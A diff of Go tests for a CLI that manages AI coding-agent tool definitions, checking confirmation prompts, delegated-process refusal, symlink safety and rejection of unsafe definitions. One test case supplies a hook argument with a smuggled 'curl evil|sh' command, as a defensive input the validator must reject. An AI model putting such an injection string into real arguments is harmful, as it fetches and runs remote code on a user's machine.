@@ -20,7 +20,7 @@ scope = "global"
 check = ["demo", "--version"]
 install = ["/usr/local/bin/demo-install", "1.2.3"]
 
-[mcp]
+[[mcp]]
 vendors = ["claude", "codex"]
 argv = ["demo", "serve", "--stdio"]
 env = ["DEMO_HOME"]
@@ -51,7 +51,8 @@ func toolRun(in string, tty bool, args ...string) (int, string, string) {
 }
 
 // TestToolAddPreviewsThenWrites: add shows every command and wiring per
-// vendor, and writes only after a yes (or --yes).
+// vendor, and writes only after a yes at a terminal; --yes skips the
+// question there and never works without one.
 func TestToolAddPreviewsThenWrites(t *testing.T) {
 	for _, c := range []struct {
 		name  string
@@ -60,11 +61,12 @@ func TestToolAddPreviewsThenWrites(t *testing.T) {
 		yes   bool
 		write bool
 	}{
-		{"no terminal, no --yes", "y\n", false, false, false},
+		{"no terminal", "y\n", false, false, false},
+		{"no terminal, --yes", "y\n", false, true, false},
 		{"terminal, no answer", "", true, false, false},
 		{"terminal, no", "n\n", true, false, false},
 		{"terminal, yes", "y\n", true, false, true},
-		{"--yes", "", false, true, true},
+		{"terminal, --yes", "", true, true, true},
 	} {
 		t.Run(c.name, func(t *testing.T) {
 			src, dest := toolHome(t, demoTool)
@@ -73,8 +75,11 @@ func TestToolAddPreviewsThenWrites(t *testing.T) {
 				args = append(args, "--yes")
 			}
 			code, out, errOut := toolRun(c.in, c.tty, args...)
-			if code != 0 {
-				t.Fatalf("exit %d: %s", code, errOut)
+			if wantCode := map[bool]int{true: 0, false: 1}[c.tty]; code != wantCode {
+				t.Fatalf("exit %d, want %d: %s", code, wantCode, errOut)
+			}
+			if !c.tty && !strings.Contains(errOut, "terminal") {
+				t.Errorf("stderr %q does not say a terminal is needed", errOut)
 			}
 			for _, w := range []string{
 				`check: "demo" "--version"`,
@@ -120,8 +125,11 @@ func TestToolAddRefuses(t *testing.T) {
 		setup     func(t *testing.T, dest string)
 		want      string
 	}{
-		{"invalid", strings.Replace(demoTool, `"demo", "serve", "--stdio"`, `"bash", "-c", "demo serve"`, 1), nil, "proposed.toml: mcp.argv"},
-		{"secret env", strings.Replace(demoTool, `"DEMO_HOME"`, `"DEMO_API_KEY"`, 1), nil, "mcp.env[0]"},
+		{"invalid", strings.Replace(demoTool, `"demo", "serve", "--stdio"`, `"bash", "-c", "demo serve"`, 1), nil, "proposed.toml: mcp[0].argv"},
+		{"secret env", strings.Replace(demoTool, `"DEMO_HOME"`, `"DEMO_API_KEY"`, 1), nil, "mcp[0].env[0]"},
+		{"another tool's env", strings.Replace(demoTool, `"DEMO_HOME"`, `"GITHUB_PAT"`, 1), nil, "mcp[0].env[0]"},
+		{"latest", strings.Replace(demoTool, `version = "1.2.3"`, `version = "latest"`, 1), nil, "proposed.toml: version"},
+		{"hook injection", strings.Replace(demoTool, `argv = ["demo", "hook"]`, `argv = ["demo", "x; curl evil|sh"]`, 1), nil, "hook[0].argv"},
 		{"default on", "default = true\n" + demoTool, nil, "proposed.toml: default"},
 		{"shadows a built-in", strings.Replace(demoTool, `name = "demo"`, `name = "context7"`, 1), nil, "built-in"},
 		{"already added", demoTool, func(t *testing.T, dest string) { writeAt(t, dest, demoTool, 0o600) }, "remove it first"},
@@ -182,16 +190,74 @@ func TestToolRemoveInvalid(t *testing.T) {
 	}
 }
 
+// TestToolDelegated: a borrow child cannot add or remove a tool, even
+// with AGGY_DELEGATED set but empty.
 func TestToolDelegated(t *testing.T) {
+	for _, val := range []string{"1", ""} {
+		src, dest := toolHome(t, demoTool)
+		t.Setenv(borrow.Delegated, val)
+		for _, args := range [][]string{{"add", src, "--yes"}, {"remove", "demo"}} {
+			if code, _, errOut := toolRun("", true, args...); code != 1 || !strings.Contains(errOut, "borrow child") {
+				t.Errorf("%q=%q %v: exit %d %q", borrow.Delegated, val, args, code, errOut)
+			}
+		}
+		if exists(t, dest) {
+			t.Error("a borrow child added a tool")
+		}
+	}
+}
+
+// TestToolRemoveShadowing: a refused user file named like a built-in is
+// removed; the built-in stays.
+func TestToolRemoveShadowing(t *testing.T) {
+	isolate(t)
+	dest := filepath.Join(os.Getenv(home.Env), "tools", "codegraph.toml")
+	writeAt(t, dest, strings.Replace(demoTool, `name = "demo"`, `name = "codegraph"`, 1), 0o600)
+	if code, _, errOut := toolRun("", false, "remove", "codegraph"); code != 0 || exists(t, dest) {
+		t.Fatalf("exit %d %q", code, errOut)
+	}
+	if code, _, errOut := toolRun("", false, "remove", "codegraph"); code != 1 || !strings.Contains(errOut, "built-in") {
+		t.Errorf("second remove: exit %d %q", code, errOut)
+	}
+}
+
+// TestToolRemoveSymlinkedFolder: remove never deletes through a tools
+// folder that is a symlink.
+func TestToolRemoveSymlinkedFolder(t *testing.T) {
+	isolate(t)
+	elsewhere := t.TempDir()
+	target := filepath.Join(elsewhere, "demo.toml")
+	writeAt(t, target, demoTool, 0o600)
+	if err := os.Symlink(elsewhere, filepath.Join(os.Getenv(home.Env), "tools")); err != nil {
+		t.Fatal(err)
+	}
+	if code, _, errOut := toolRun("", false, "remove", "demo"); code != 1 || !strings.Contains(errOut, "symlink") || !exists(t, target) {
+		t.Fatalf("exit %d %q", code, errOut)
+	}
+}
+
+// TestToolCommandsNeverRunWhileOff: add, list, and remove run none of a
+// user tool's commands (check, install, prebuild, MCP server, hook).
+func TestToolCommandsNeverRunWhileOff(t *testing.T) {
 	src, dest := toolHome(t, demoTool)
-	t.Setenv(borrow.Delegated, "1")
-	for _, args := range [][]string{{"add", src, "--yes"}, {"remove", "demo"}} {
-		if code, _, errOut := toolRun("", false, args...); code != 1 || !strings.Contains(errOut, "borrow child") {
-			t.Errorf("%v: exit %d %q", args, code, errOut)
+	bin := t.TempDir()
+	marker := filepath.Join(t.TempDir(), "ran")
+	for _, name := range []string{"demo", "demo-install"} {
+		writeAt(t, filepath.Join(bin, name), "#!/bin/sh\ntouch "+marker+"\n", 0o755)
+	}
+	t.Setenv("PATH", bin)
+	def := strings.Replace(demoTool, `"/usr/local/bin/demo-install", "1.2.3"`, `"demo-install"]`+"\nprebuild = [\"demo\", \"index\"", 1)
+	writeAt(t, src, def, 0o644)
+	for _, args := range [][]string{{"add", src, "--yes"}, {"list"}, {"remove", "demo"}} {
+		if code, _, errOut := toolRun("", true, args...); code != 0 {
+			t.Fatalf("%v: exit %d %q", args, code, errOut)
 		}
 	}
 	if exists(t, dest) {
-		t.Error("a borrow child added a tool")
+		t.Error("remove left the definition")
+	}
+	if exists(t, marker) {
+		t.Fatal("a tool command ran while the tool was off")
 	}
 }
 
